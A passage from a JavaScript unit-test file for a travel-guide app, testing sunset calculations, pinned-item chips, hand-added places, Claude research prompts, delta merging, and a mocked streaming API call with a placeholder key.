  // And polar night, the other side of the same fact.
  assert.equal(C.sunKit.sunsetUtcMinutes('2026-12-21', 78.22, 15.65), null);
});

test('sunsetUtcMinutes refuses anything that is not a date and a real coordinate', () => {
  assert.equal(C.sunKit.sunsetUtcMinutes('2026-8-26', 41.33, 19.81), null);
  assert.equal(C.sunKit.sunsetUtcMinutes('', 41.33, 19.81), null);
  assert.equal(C.sunKit.sunsetUtcMinutes(null, 41.33, 19.81), null);
  assert.equal(C.sunKit.sunsetUtcMinutes('2026-08-26', '41.33', 19.81), null);
  assert.equal(C.sunKit.sunsetUtcMinutes('2026-08-26', 91, 19.81), null);
  assert.equal(C.sunKit.sunsetUtcMinutes('2026-08-26', 41.33, 181), null);
  assert.equal(C.sunKit.sunsetUtcMinutes('2026-08-26', NaN, 19.81), null);
});

test('julianDayUtc and the equation of time hold their known anchors', () => {
  // J2000.0 is Julian Day 2451545.0 at 2000-01-01 12:00 UTC, so midnight that
  // day is exactly half a day earlier. If this drifts, every sunset drifts.
  assert.equal(C.sunKit.julianDayUtc('2000-01-01'), 2451544.5);
  assert.equal(C.sunKit.julianDayUtc('2026-08-26'), 2461278.5);
  // The equation of time crosses zero four times a year and reaches about
  // -14 minutes in mid-February and +16 in early November.
  const feb = C.sunKit.equationOfTime((C.sunKit.julianDayUtc('2026-02-11') - 2451545) / 36525);
  const nov = C.sunKit.equationOfTime((C.sunKit.julianDayUtc('2026-11-03') - 2451545) / 36525);
  assert.ok(feb < -13 && feb > -15, 'mid-February should be near -14 min, got ' + feb.toFixed(2));
  assert.ok(nov > 15 && nov < 17, 'early November should be near +16 min, got ' + nov.toFixed(2));
  // Declination is near zero at an equinox and near the obliquity at a solstice.
  const eq = C.sunKit.sunDeclination((C.sunKit.julianDayUtc('2026-03-20') - 2451545) / 36525);
  const sol = C.sunKit.sunDeclination((C.sunKit.julianDayUtc('2026-06-21') - 2451545) / 36525);
  assert.ok(Math.abs(eq) < 0.6, 'equinox declination should be near 0, got ' + eq.toFixed(3));
  assert.ok(sol > 23.2 && sol < 23.6, 'solstice declination should be near 23.44, got ' + sol.toFixed(3));
});

test('cityLatLng prefers the accommodation and falls back to the first item with coords', () => {
  assert.deepEqual(C.sunKit.cityLatLng(GOOD), { lat: 41.64, lng: 41.61 });
  // Tirana's real shape: no city.accommodation at all, coordinates only on the
  // apartment item. Without this fallback the city the owner is standing in
  // would be the one city with no sunset chip.
  const noAcc = clone(GOOD);
  delete noAcc.city.accommodation;
  noAcc.items[0].meta = { coords: { lat: 41.33, lng: 19.8101 } };
  assert.deepEqual(C.sunKit.cityLatLng(noAcc), { lat: 41.33, lng: 19.8101 });
  // Nothing anywhere: null, and the header simply omits the chip.
  const bare = clone(GOOD);
  delete bare.city.accommodation;
  assert.equal(C.sunKit.cityLatLng(bare), null);
  // A half-filled or out-of-range coordinate is not a location.
  const half = clone(GOOD);
  half.city.accommodation = { name: 'Somewhere', lat: 41.64 };
  assert.equal(C.sunKit.cityLatLng(half), null);
  half.city.accommodation = { name: 'Somewhere', lat: 200, lng: 10 };
  assert.equal(C.sunKit.cityLatLng(half), null);
  assert.equal(C.sunKit.cityLatLng(null), null);
});

test('cityUtcOffsetMinutes takes only a real offset, in minutes', () => {
  assert.equal(C.sunKit.cityUtcOffsetMinutes({ city: { utc_offset: 120 } }), 120);
  assert.equal(C.sunKit.cityUtcOffsetMinutes({ city: { utc_offset: -300 } }), -300);
  assert.equal(C.sunKit.cityUtcOffsetMinutes({ city: { utc_offset: 0 } }), 0);
  // Absent, the wrong type, or off the real world's map: null, and the chip
  // falls back to the reader's device clock rather than inventing an offset.
  assert.equal(C.sunKit.cityUtcOffsetMinutes({ city: {} }), null);
  assert.equal(C.sunKit.cityUtcOffsetMinutes({ city: { utc_offset: '120' } }), null);
  assert.equal(C.sunKit.cityUtcOffsetMinutes({ city: { utc_offset: NaN } }), null);
  assert.equal(C.sunKit.cityUtcOffsetMinutes({ city: { utc_offset: 900 } }), null);
  assert.equal(C.sunKit.cityUtcOffsetMinutes({ city: { utc_offset: -900 } }), null);
  assert.equal(C.sunKit.cityUtcOffsetMinutes(null), null);
});

test('every real city states its own offset, so a guide read from elsewhere is still right', () => {
  // Without this, opening next week's Ksamil guide from Tiranë shows Tiranë's
  // clock. Georgia and Armenia sit at UTC+4 year round; Albania is on CEST
  // through October, and every stay here is one week, so a fixed number is
  // exact for the whole stay.
  const fs = require('fs');
  const path = require('path');
  const want = { batumi: 240, yerevan: 240, tirana: 120, ksamil: 120 };
  const localSunset = {};
  Object.keys(want).forEach((name) => {
    const city = JSON.parse(fs.readFileSync(
      path.join(__dirname, '..', 'cities', name + '.json'), 'utf8'));
    assert.equal(C.sunKit.cityUtcOffsetMinutes(city), want[name], name + ' offset');
    const loc = C.sunKit.cityLatLng(city);
    const mins = C.sunKit.sunsetUtcMinutes(city.city.dates.from, loc.lat, loc.lng);
    const local = Math.floor(mins) + want[name];  // a clock reads the minute you are in
    localSunset[name] = Math.floor(local / 60) + ':' + ('0' + (local % 60)).slice(-2);
  });
  // Arrival-day sunset on each city's OWN clock. Every one of these is the
  // met.no UTC time plus that city's offset, checked by hand when this landed.
  assert.deepEqual(localSunset, {
    batumi: '20:23',    // met.no 2026-08-08 16:23 UTC, +4
    yerevan: '19:59',   // met.no 2026-08-15 15:59 UTC, +4
    tirana: '19:29',    // met.no 2026-08-22 17:29 UTC, +2
    ksamil: '19:16'     // met.no 2026-08-29 17:16 UTC, +2
  });
});

test('the real city files all resolve to a location, so every guide gets the chip', () => {
  const fs = require('fs');
  const path = require('path');
  ['batumi', 'yerevan', 'tirana', 'ksamil'].forEach((name) => {
    const city = JSON.parse(fs.readFileSync(
      path.join(__dirname, '..', 'cities', name + '.json'), 'utf8'));
    const loc = C.sunKit.cityLatLng(city);
    assert.ok(loc, name + ' resolves to no location, so its header would show no sunset');
    const mins = C.sunKit.sunsetUtcMinutes(city.city.dates.from, loc.lat, loc.lng);
    assert.equal(typeof mins, 'number', name + ' has a location but no computable sunset');
  });
});

test('sunsetUtcMinutes is pure: same answer twice, arguments untouched', () => {
  const a = C.sunKit.sunsetUtcMinutes('2026-08-26', 41.33, 19.8101);
  const b = C.sunKit.sunsetUtcMinutes('2026-08-26', 41.33, 19.8101);
  assert.equal(a, b);
  const snap = JSON.stringify(GOOD);
  C.sunKit.cityLatLng(GOOD);
  assert.equal(JSON.stringify(GOOD), snap);
});

// ---------------------------------------------------------------------------
// Header highlights, feature B: pinned items
// ---------------------------------------------------------------------------

test('a state written before pins existed reads as nothing pinned', () => {
  const old = { itemStatus: {}, itemDay: {}, collapsedSections: {}, viewMode: null };
  assert.deepEqual(C.normalizeState(old).pinned, []);
  assert.deepEqual(C.emptyState().pinned, []);
  // Garbage in that slot resets rather than coerces: a half-understood pin
  // list is worth less than no pins, and re-pinning is one tap.
  assert.deepEqual(C.normalizeState({ pinned: 'brasserie' }).pinned, []);
  assert.deepEqual(C.normalizeState({ pinned: null }).pinned, []);
  assert.deepEqual(C.normalizeState({ pinned: { brasserie: 1 } }).pinned, []);
  // Non-string entries and duplicates are dropped, order otherwise kept.
  assert.deepEqual(C.normalizeState({ pinned: ['a', 'a', 3, '', null, 'b'] }).pinned, ['a', 'b']);
});

test('pins round-trip through a store, which is what makes them sync', () => {
  // The state object is what syncKit pushes as one payload, so a key that
  // survives save/load/normalize is a key that reaches the other device.
  const mem = {};
  const LS = {
    getItem: (k) => (Object.prototype.hasOwnProperty.call(mem, k) ? mem[k] : null),
    setItem: (k, v) => { mem[k] = String(v); },
    removeItem: (k) => { delete mem[k]; }
  };
  const s1 = C.makeStore('tirana-2026-08-22', LS);
  const st = s1.load();
  C.pinKit.toggle(st, 'safety-01');
  C.pinKit.toggle(st, 'money-03');
  s1.save(st);
  // A brand new store instance, exactly as a reload or another tab gets.
  const s2 = C.makeStore('tirana-2026-08-22', LS);
  const back = s2.load();
  assert.deepEqual(back.pinned, ['safety-01', 'money-03']);
  assert.equal(C.pinKit.isPinned(back, 'safety-01'), true);
  assert.equal(C.pinKit.isPinned(back, 'nothing'), false);
  // And the raw stored payload really carries it, not just the in-memory copy.
  assert.deepEqual(JSON.parse(mem['cityops.tirana-2026-08-22.v1']).pinned,
    ['safety-01', 'money-03']);
});

test('the pin cap holds at four and refuses a fifth without evicting anything', () => {
  const st = C.emptyState();
  assert.equal(C.pinKit.CAP, 4);
  ['a', 'b', 'c', 'd'].forEach((id) => {
    assert.equal(C.pinKit.canToggle(st, id), true);
    C.pinKit.toggle(st, id);
  });
  assert.deepEqual(st.pinned, ['a', 'b', 'c', 'd']);
  // At the cap the control on a NEW item is dead, and says so; the oldest pin
  // is not silently thrown away to make room.
  assert.equal(C.pinKit.canToggle(st, 'e'), false);
  C.pinKit.toggle(st, 'e');
  assert.deepEqual(st.pinned, ['a', 'b', 'c', 'd']);
  // Unpinning an already-pinned one is always allowed, cap or no cap.
  assert.equal(C.pinKit.canToggle(st, 'b'), true);
  C.pinKit.toggle(st, 'b');
  assert.deepEqual(st.pinned, ['a', 'c', 'd']);
  // And now there is room again.
  assert.equal(C.pinKit.canToggle(st, 'e'), true);
  C.pinKit.toggle(st, 'e');
  assert.deepEqual(st.pinned, ['a', 'c', 'd', 'e']);
});

test('pinnedItems keeps pin order and drops ids the guide no longer has', () => {
  const st = C.emptyState();
  C.pinKit.toggle(st, 'nord');
  C.pinKit.toggle(st, 'ghost');       // never existed
  C.pinKit.toggle(st, 'brasserie');
  const got = C.pinKit.items(GOOD, st);
  assert.deepEqual(got.map((i) => i.id), ['nord', 'brasserie']);
  // An enrich re-run or a data update can retire an item under a pin. That is
  // a dropped chip, not an error and not an empty chip.
  const shrunk = clone(GOOD);
  shrunk.items = shrunk.items.filter((i) => i.id !== 'nord');
  assert.deepEqual(C.pinKit.items(shrunk, st).map((i) => i.id), ['brasserie']);
  assert.deepEqual(C.pinKit.items({ items: [] }, st), []);
});

test('a chip summarises a name and note the way the real Info data reads', () => {
  const chip = C.pinKit.chipText;
  // The common Info shape: short name, note carrying the fact.
  assert.equal(chip('Tap water', 'Meaningfully better than Morocco. Brush teeth, shower, and wash produce freely; drink bottled.'),
    'Tap water · Meaningfully better than Morocco');
  // When the note repeats the name back, the name is dropped rather than
  // stuttered: Tirana's real "Fares" / "Fares rise ~5% after 22:00".
  assert.equal(chip('Fares', 'Fares rise ~5% after 22:00. Tirana is the cheapest taxi market in Albania.'),
    'Fares rise ~5% after 22:00');
  // A ` · ` clause ends the fragment too, since these notes use it as a
  // separator between whole facts.
  assert.equal(chip('Mental math', 'Drop two zeros, add 20%. (1,800 L) · Multiply by 8'),
    'Mental math · Drop two zeros, add 20%');
  // A name that already fills the budget gets no note appended.
  assert.equal(chip('Fake police near Skanderbeg Square', 'Plainclothes person asks to inspect wallet.'),
    'Fake police near Skanderbeg Square');
  // Nothing longer than the cap ever reaches the row, and a truncation always
  // says it truncated.
  const long = chip('Departure', 'Leave base by 08:45 for Tirana North and South Bus Terminal in Kashar, six km west');
  assert.ok(long.length <= C.pinKit.CHIP_MAX, 'chip was ' + long.length + ' chars: ' + long);
  assert.ok(long.slice(-1) === '…', 'a cut chip must say it was cut: ' + long);
  // No note at all is fine; so is no name.
  assert.equal(chip('Walking distances', ''), 'Walking distances');
  assert.equal(chip('Walking distances', null), 'Walking distances');
  assert.equal(chip('', 'Bolt does NOT operate anywhere in Albania.'), 'Bolt does NOT operate anywhere in Albania');
  assert.equal(chip('', ''), '');
  // Whitespace and newlines in a note never reach the row.
  assert.equal(chip('Payment', '  May be cash\n  to on-site staff. Confirm in advance.'),
    'Payment · May be cash to on-site staff');
});

test('every real Info item produces a chip that fits the row', () => {
  const fs = require('fs');
  const path = require('path');
  const city = JSON.parse(fs.readFileSync(
    path.join(__dirname, '..', 'cities', 'tirana.json'), 'utf8'));
  let checked = 0;
  city.items.forEach((it) => {
    const sec = city.sections.filter((s) => s.id === it.section)[0];
    if (C.tabForSection(sec) !== 'info') return;
    const text = C.pinKit.chipText(it.name, it.note);
    assert.ok(text, it.id + ' produces an empty chip');
    assert.ok(text.length <= C.pinKit.CHIP_MAX,
      it.id + ' chip is ' + text.length + ' chars: ' + text);
    assert.equal(text.indexOf('\n'), -1, it.id + ' chip carries a newline');
    checked++;
  });
  assert.ok(checked > 20, 'expected the real Info tab to be worth checking, saw ' + checked);
});

// ---------------------------------------------------------------------------
// Add a place by hand
// ---------------------------------------------------------------------------

test('newPlaceDelta builds a delta mergeDelta accepts, and the place lands intact', () => {
  const built = C.newPlaceDelta(GOOD, {
    name: 'Oda Garden', section: 'dinner', status: 'plan',
    note: 'recommended by a couple at dinner', day: '2026-08-12'
  });
  assert.deepEqual(built.errors, []);
  assert.equal(built.id, 'oda-garden');
  assert.equal(built.delta.schema, 1);
  assert.equal(built.delta.delta, true);
  assert.equal(built.delta.items.length, 1);
  // The whole point of routing through a delta: the same validateItem every
  // AI payload faces has to pass it.
  const res = C.mergeDelta(GOOD, built.delta);
  assert.deepEqual(res.errors, []);
  assert.equal(res.summary.added, 1);
  assert.equal(res.summary.skipped, 0);
  const added = res.data.items.filter((i) => i.id === 'oda-garden')[0];
  assert.equal(added.name, 'Oda Garden');
  assert.equal(added.section, 'dinner');
  assert.equal(added.status, 'plan');
  assert.equal(added.day, '2026-08-12');
  assert.equal(added.note, 'recommended by a couple at dinner');
  assert.equal(added.added_by, 'traveler');
  assert.deepEqual(added.links, []);
  // Normalized like every merged item, so nothing downstream sees a new shape.
  assert.equal(added.place_id, null);
  assert.equal(added.verified, null);
  // And the merged guide is still a valid guide.
  assert.deepEqual(C.validate(res.data), []);
  // Nothing already there moved.
  assert.equal(res.data.items.length, GOOD.items.length + 1);
  GOOD.items.forEach((orig, i) => assert.equal(res.data.items[i].id, orig.id));
});

test('the same name twice makes two places, not one silent skip', () => {
  // A human typing "Oda" twice means two restaurants far more often than it
  // means a mistake, and mergeDelta would count a repeated id as `skipped`.
  let city = GOOD;
  const first = C.newPlaceDelta(city, { name: 'Oda', section: 'dinner' });
  city = C.mergeDelta(city, first.delta).data;
  const second = C.newPlaceDelta(city, { name: 'Oda', section: 'dinner' });
  assert.equal(first.id, 'oda');
  assert.equal(second.id, 'oda-2');
  const res = C.mergeDelta(city, second.delta);
  assert.equal(res.summary.added, 1);
  assert.equal(res.summary.skipped, 0);
  const third = C.newPlaceDelta(res.data, { name: 'Oda', section: 'dinner' });
  assert.equal(third.id, 'oda-3');
  // A collision with an id the guide already holds for another reason.
  const clash = C.newPlaceDelta(GOOD, { name: 'Nord Specialty Coffee', section: 'coffee' });
  assert.equal(clash.id, 'nord-specialty-coffee');
  const clash2 = C.newPlaceDelta(GOOD, { name: 'brasserie', section: 'dinner' });
  assert.equal(clash2.id, 'brasserie-2');
});

test('a name that slugs to nothing still gets a usable id', () => {
  // This route runs through Georgia, Armenia and Albania; a name typed in the
  // local script slugs to an empty string.
  const a = C.newPlaceDelta(GOOD, { name: 'ხაჭაპური', section: 'dinner' });
  assert.equal(a.id, 'place');
  assert.deepEqual(C.mergeDelta(GOOD, a.delta).errors, []);
  const city = C.mergeDelta(GOOD, a.delta).data;
  const b = C.newPlaceDelta(city, { name: 'Ոսկե', section: 'dinner' });
  assert.equal(b.id, 'place-2');
});

test('the add form refuses what a form can get wrong, before mergeDelta ever runs', () => {
  const bad = (f) => C.newPlaceDelta(GOOD, f);
  assert.deepEqual(bad({ name: '', section: 'dinner' }).errors, ['A name is required.']);
  assert.deepEqual(bad({ name: '   ', section: 'dinner' }).errors, ['A name is required.']);
  assert.equal(bad({ name: 'X', section: '' }).errors[0], 'Pick a section.');
  assert.equal(bad({ name: 'X', section: 'nope' }).errors[0], 'This city has no section "nope".');
  assert.equal(bad({ name: 'X', section: 'dinner', day: 'tonight' }).errors[0],
    'The day must be YYYY-MM-DD.');
  // done and archived are traveler states, never a starting one, exactly as
  // mergeDelta insists for an AI payload.
  assert.equal(bad({ name: 'X', section: 'dinner', status: 'done' }).errors[0],
    'A new place starts as plan or backup.');
  assert.equal(bad({ name: 'X', section: 'dinner', status: 'archived' }).errors[0],
    'A new place starts as plan or backup.');
  // Every failing case returns no delta at all, so a caller cannot half-apply.
  ['', '   '].forEach((n) => assert.equal(bad({ name: n, section: 'dinner' }).delta, null));
  // Defaults: status plan, no day, no note.
  const ok = C.newPlaceDelta(GOOD, { name: 'Somewhere', section: 'coffee' });
  assert.deepEqual(ok.errors, []);
  assert.equal(ok.delta.items[0].status, 'plan');
  assert.equal(ok.delta.items[0].day, undefined);
  assert.equal(ok.delta.items[0].note, undefined);
  // Backup is the other legal start.
  assert.equal(C.newPlaceDelta(GOOD, { name: 'Y', section: 'coffee', status: 'backup' })
    .delta.items[0].status, 'backup');
});

test('newPlaceDelta is pure: it reads the city and changes nothing', () => {
  const snap = JSON.stringify(GOOD);
  C.newPlaceDelta(GOOD, { name: 'Oda Garden', section: 'dinner', note: 'x' });
  assert.equal(JSON.stringify(GOOD), snap);
});

// ---------------------------------------------------------------------------
// Ask Claude about one place
// ---------------------------------------------------------------------------

const RIVALS = (() => {
  const c = clone(GOOD);
  c.items.filter((i) => i.id === 'brasserie')[0].intel =
    { verdicts: [{ tier: 'must', text: 'The duck is the reason to come.' }], source: 'reviews' };
  c.items.filter((i) => i.id === 'brasserie')[0].rating = { stars: 4.8, count: 5545 };
  c.items.filter((i) => i.id === 'tanini')[0].rating = { stars: 4.2 };
  return c;
})();

test('buildPlacePassPrompt names one place and rosters exactly its own section', () => {
  const built = C.newPlaceDelta(RIVALS, {
    name: 'Oda Garden', section: 'dinner', status: 'plan',
    note: 'recommended by a couple at dinner'
  });
  const city = C.mergeDelta(RIVALS, built.delta).data;
  const item = city.items.filter((i) => i.id === built.id)[0];
  const out = C.promptKit.buildPlacePassPrompt(FAKE_RERUN, city, item, C.emptyState());

  assert.ok(out.startsWith('You are checking one place a traveler added by hand'));
  assert.ok(out.includes('- **City:** Batumi'));
  assert.ok(out.includes('## The place'));
  assert.ok(out.includes('- **Item id:** oda-garden'));
  assert.ok(out.includes('- **Name as the traveler typed it:** Oda Garden'));
  assert.ok(out.includes('- **Section:** Dinner (dinner)'));
  assert.ok(out.includes('- **The traveler\'s note:** recommended by a couple at dinner'));
  assert.ok(out.includes('Research the ONE place named above'));
  assert.equal(out.indexOf('RERUN:PLACE'), -1);

  // The roster: every OTHER dinner item, with what is known about it.
  assert.ok(out.includes('## Others already in this section'));
  assert.ok(out.includes('- brasserie | Brasserie 1900 | 4.8★ (5545) | plan'));
  assert.ok(out.includes('    verdict (must): The duck is the reason to come.'));
  assert.ok(out.includes('- tanini | Tanini | 4.2★ | plan'));
  assert.ok(out.includes('- sisters | At the Sisters | backup'));
  // An unresearched rival says so, so the answer can admit a partial ranking
  // instead of reading silence as a bad score.
  assert.ok(out.includes('    not researched yet'));
  // The count the verdict is told to use is the real one.
  assert.ok(out.includes('There are 3 of them.'));
  // Another section's items are not the comparison and are not in the prompt.
  assert.equal(out.indexOf('Nord Specialty Coffee'), -1);
  // Never its own rival.
  assert.equal(out.indexOf('- oda-garden | Oda Garden'), -1);
});

test('a place with no rivals says so instead of pretending to rank', () => {
  const city = clone(GOOD);
  city.sections.push({ id: 'bars', label: 'Bars' });
  const built = C.newPlaceDelta(city, { name: 'Lonely Bar', section: 'bars' });
  const merged = C.mergeDelta(city, built.delta).data;
  const item = merged.items.filter((i) => i.id === built.id)[0];
  const out = C.promptKit.buildPlacePassPrompt(FAKE_RERUN, merged, item, C.emptyState());
  assert.ok(out.includes('- **Section:** Bars (bars)'));
  assert.ok(out.includes('There are none: this is the first place in this section'));
  assert.equal(out.indexOf('There are 0 of them'), -1);
});

test('the place prompt reads the traveler\'s renames and status changes, not the file', () => {
  const st = C.emptyState();
  C.setTitle(st, 'brasserie', 'Brasserie (the good one)');
  C.setStatus(st, 'tanini', 'done');
  const item = RIVALS.items.filter((i) => i.id === 'sisters')[0];
  const out = C.promptKit.buildPlacePassPrompt(FAKE_RERUN, RIVALS, item, st);
  assert.ok(out.includes('- brasserie | Brasserie (the good one) | 4.8★ (5545) | plan'));
  // A place already eaten at stays in the roster: it is exactly the yardstick
  // a new recommendation has to beat.
  assert.ok(out.includes('- tanini | Tanini | 4.2★ | done'));
  // With no state at all the file's own names and statuses are used.
  const bare = C.promptKit.buildPlacePassPrompt(FAKE_RERUN, RIVALS, item, null);
  assert.ok(bare.includes('- brasserie | Brasserie 1900 | 4.8★ (5545) | plan'));
});

test('buildPlacePassPrompt is pure and fails loudly on a template with no landmark', () => {
  const item = RIVALS.items[0];
  const snap = JSON.stringify(RIVALS);
  C.promptKit.buildPlacePassPrompt(FAKE_RERUN, RIVALS, item, C.emptyState());
  assert.equal(JSON.stringify(RIVALS), snap);
  assert.throws(() => C.promptKit.buildPlacePassPrompt('# nothing here', RIVALS, item),
    /no RERUN:PLACE block/);
  assert.throws(() => C.promptKit.buildPlacePassPrompt(FAKE_RERUN, RIVALS, null),
    /No place to research/);
});

test('the real PROMPT.md builds a place pass that demands a ranking and a lookup', () => {
  const fs = require('fs');
  const path = require('path');
  const prompt = fs.readFileSync(path.join(__dirname, '..', 'PROMPT.md'), 'utf8');
  const built = C.newPlaceDelta(RIVALS, {
    name: 'Oda Garden', section: 'dinner', note: 'recommended by a couple at dinner'
  });
  const city = C.mergeDelta(RIVALS, built.delta).data;
  const item = city.items.filter((i) => i.id === built.id)[0];
  const out = C.promptKit.buildPlacePassPrompt(prompt, city, item, C.emptyState());
  // The contract the app's Apply path depends on.
  assert.ok(out.includes('"schema": 1'));
  assert.ok(out.includes('"delta": true'));
  assert.ok(out.includes('"ratings": {'));
  assert.ok(out.includes('"intel": {'));
  // The comparison, which is the whole point of this pass.
  assert.ok(out.includes('Lead with the placement, in plain words.'));
  assert.ok(out.includes('Ranks 2nd of your 7 dinner picks'));
  assert.ok(out.includes('Never guess, never carry a number forward from memory.'));
  assert.ok(out.includes('Match the right place.'));
  // A delta is never a whole guide, said in this block as in every other.
  assert.ok(out.includes('A delta is never a whole guide.'));
  // And the roster it has to rank against is really in there.
  assert.ok(out.includes('- brasserie | Brasserie 1900 | 4.8★ (5545) | plan'));
});

test('the whole add-then-ask round trip lands a rating and a ranking on the new card', () => {
  // Exactly the owner's dinner scenario, end to end, with the AI reply
  // simulated: add the place, build its prompt, paste back what the contract
  // asks for, and merge it through the one door the app uses.
  const fs = require('fs');
  const path = require('path');
  const prompt = fs.readFileSync(path.join(__dirname, '..', 'PROMPT.md'), 'utf8');
  const built = C.newPlaceDelta(RIVALS, {
    name: 'Oda Garden', section: 'dinner', status: 'plan',
    note: 'recommended by a couple at dinner'
  });
  const withPlace = C.mergeDelta(RIVALS, built.delta).data;
  const item = withPlace.items.filter((i) => i.id === built.id)[0];
  const promptText = C.promptKit.buildPlacePassPrompt(prompt, withPlace, item, C.emptyState());
  assert.ok(promptText.includes('oda-garden'));

  // What Claude sends back, in the shape RERUN:PLACE specifies.
  const reply = [
    'I looked it up.', '', '```json',
    JSON.stringify({
      schema: 1, delta: true,
      ratings: { 'oda-garden': { stars: 4.6, count: 812, source: 'Google Maps, Aug 2026', checked: '2026-08-26' } },
      intel: {
        'oda-garden': {
          verdicts: [{ tier: 'good', text: 'A fair swap for one dinner night, not a must.' }],
          tips: ['Ranks 2nd of your 4 dinner picks, behind Brasserie 1900.'],
          source: 'Google Maps reviews, Aug 2026'
        }
      }
    }, null, 2),
    '```'
  ].join('\n');

  const block = C.extractJsonBlock(reply);
  assert.ok(block, 'the reply must carry a parseable json fence');
  const res = C.mergeDelta(withPlace, JSON.parse(block));
  assert.deepEqual(res.errors, []);
  assert.equal(res.summary.added, 0);          // the place is already there
  assert.equal(res.summary.ratingsApplied, 1);
  assert.equal(res.summary.intelApplied, 1);
  const done = res.data.items.filter((i) => i.id === 'oda-garden')[0];
  assert.equal(done.rating.stars, 4.6);
  assert.equal(done.rating.count, 812);
  assert.equal(done.intel.tips[0], 'Ranks 2nd of your 4 dinner picks, behind Brasserie 1900.');
  assert.equal(done.intel.verdicts[0].tier, 'good');
  // Nothing the traveler had already researched was touched.
  const rival = res.data.items.filter((i) => i.id === 'brasserie')[0];
  assert.equal(rival.rating.stars, 4.8);
  assert.equal(rival.intel.verdicts[0].text, 'The duck is the reason to come.');
  assert.deepEqual(C.validate(res.data), []);
  // The card now carries research, so the engine stops offering to go get it.
  assert.ok(done.rating && typeof done.rating.stars === 'number');
});

test('a place pass reply that names the wrong id changes nothing, and says so', () => {
  const built = C.newPlaceDelta(RIVALS, { name: 'Oda Garden', section: 'dinner' });
  const city = C.mergeDelta(RIVALS, built.delta).data;
  const res = C.mergeDelta(city, {
    schema: 1, delta: true,
    ratings: { 'oda-gardens': { stars: 4.6 } },
    intel: { 'oda-gardens': { tips: ['Ranks 1st'] } }
  });
  assert.deepEqual(res.errors, []);
  assert.equal(res.summary.ratingsSkipped, 1);
  assert.equal(res.summary.intelSkipped, 1);
  assert.equal(res.data.items.filter((i) => i.id === 'oda-garden')[0].rating, undefined);
});

// ---------------------------------------------------------------------------
// The in-app transport, with a mocked fetch (no key, no network, no cost)
// ---------------------------------------------------------------------------
// callClaudeStream lives in the app shell rather than the engine, so it is
// pulled out of the assembled index.html by name and run against a fake
// streaming response. This is what proves the one-tap path parses a real
// Anthropic SSE stream into the fenced JSON the Apply path then merges,
// without spending anything to find out.
function loadCallClaudeStream(fetchImpl) {
  const fs = require('fs');
  const path = require('path');
  const html = fs.readFileSync(path.join(__dirname, '..', 'index.html'), 'utf8');
  const start = html.indexOf('function callClaudeStream(');
  assert.ok(start !== -1, 'callClaudeStream is missing from the assembled app');
  const end = html.indexOf('\n  }\n', start);
  assert.ok(end !== -1, 'could not find the end of callClaudeStream');
  const src = html.slice(start, end + 4);
  const fn = new Function('fetch', 'TextDecoder', 'CLAUDE_MODEL', 'CLAUDE_MAX_TOKENS',
    src + '\nreturn callClaudeStream;');
  return fn(fetchImpl, TextDecoder, 'claude-test', 1000);
}

function sseBody(events) {
  // Chunked at awkward boundaries on purpose: the real stream splits wherever
  // the network feels like it, and the parser has to survive an event cut in
  // half. Every chunk here is 7 bytes.
  const text = events.map((e) => 'event: ' + e.type + '\ndata: ' + JSON.stringify(e) + '\n\n').join('');
  const bytes = new TextEncoder().encode(text);
  let at = 0;
  return {
    getReader: () => ({
      read: () => {
        if (at >= bytes.length) return Promise.resolve({ done: true });
        const slice = bytes.slice(at, at + 7);
        at += 7;
        return Promise.resolve({ done: false, value: slice });
      }
    })
  };
}

let asyncPending = 0, asyncFail = 0;
function asyncTest(name, fn) {
  asyncPending++;
  fn().then(() => { pass++; console.log('PASS ' + name); },
    (e) => { fail++; asyncFail++; console.log('FAIL ' + name + '\n  ' + (e && e.message)); })
    .then(() => { asyncPending--; });
}

asyncTest('callClaudeStream turns a streamed reply into the delta the Apply path merges', () => {
  const delta = {
    schema: 1, delta: true,
    ratings: { 'oda-garden': { stars: 4.6, count: 812 } },
    intel: { 'oda-garden': { tips: ['Ranks 2nd of your 4 dinner picks.'] } }
  };
  const answer = 'Checked it.\n\n```json\n' + JSON.stringify(delta) + '\n```';
  let seenRequest = null;
  const events = [
    { type: 'content_block_delta', delta: { type: 'thinking_delta', thinking: 'weighing it up' } }
  ].concat(answer.match(/[\s\S]{1,20}/g).map((chunk) => (
    { type: 'content_block_delta', delta: { type: 'text_delta', text: chunk } }
  )));
  const call = loadCallClaudeStream((url, opts) => {
    seenRequest = { url: url, opts: opts };
    return Promise.resolve({ ok: true, body: sseBody(events) });
  });
  const progress = [];
  return call('THE PROMPT', 'sk-test-not-a-real-key', (p) => progress.push(p)).then((text) => {
    // The request itself: the browser-direct header and the key, and the
    // prompt the engine built, verbatim.
    assert.equal(seenRequest.url, 'https://api.anthropic.com/v1/messages');
    assert.equal(seenRequest.opts.headers['x-api-key'], 'sk-test-not-a-real-key');
    assert.equal(seenRequest.opts.headers['anthropic-dangerous-direct-browser-access'], 'true');
    assert.equal(JSON.parse(seenRequest.opts.body).messages[0].content, 'THE PROMPT');
    // Thinking never contributes to the text the caller parses.
    assert.equal(text, answer);
    assert.ok(progress.filter((p) => p.kind === 'thinking').length >= 1);
    assert.ok(progress.filter((p) => p.kind === 'text').length >= 2);
    // And the parse-and-merge the app does next really works on it.
    const block = C.extractJsonBlock(text);
    const built = C.newPlaceDelta(RIVALS, { name: 'Oda Garden', section: 'dinner' });
    const city = C.mergeDelta(RIVALS, built.delta).data;
    const res = C.mergeDelta(city, JSON.parse(block));
    assert.deepEqual(res.errors, []);
    assert.equal(res.summary.ratingsApplied, 1);
    assert.equal(res.data.items.filter((i) => i.id === 'oda-garden')[0].rating.stars, 4.6);
  });
});

asyncTest('a Claude API error surfaces as a message the modal can show as-is', () => {
  const call = loadCallClaudeStream(() => Promise.resolve({
    ok: false, status: 401,
    text: () => Promise.resolve(JSON.stringify({ error: { message: 'invalid x-api-key' } }))
  }));
  return call('p', 'bad-key', null).then(
    () => { throw new Error('expected a rejection'); },
    (e) => {
      assert.ok(/401/.test(e.message), e.message);
      assert.ok(/invalid x-api-key/.test(e.message), e.message);
    });
});

asyncTest('a reply with no JSON fence is reported, never half applied', () => {
  const events = 'I could not find that place anywhere.'.match(/[\s\S]{1,9}/g)
    .map((t) => ({ type: 'content_block_delta', delta: { type: 'text_delta', text: t } }));
  const call = loadCallClaudeStream(() => Promise.resolve({ ok: true, body: sseBody(events) }));
  return call('p', 'k', null).then((text) => {
    assert.equal(text, 'I could not find that place anywhere.');
    assert.equal(C.extractJsonBlock(text), null);
    assert.ok(/single ```json code block/.test(C.RETRY_INSTRUCTION));
  });
});


// The async tests above resolve on a microtask, so the summary has to wait
// for them or it reports before they have run and the exit code lies.
function finish() {
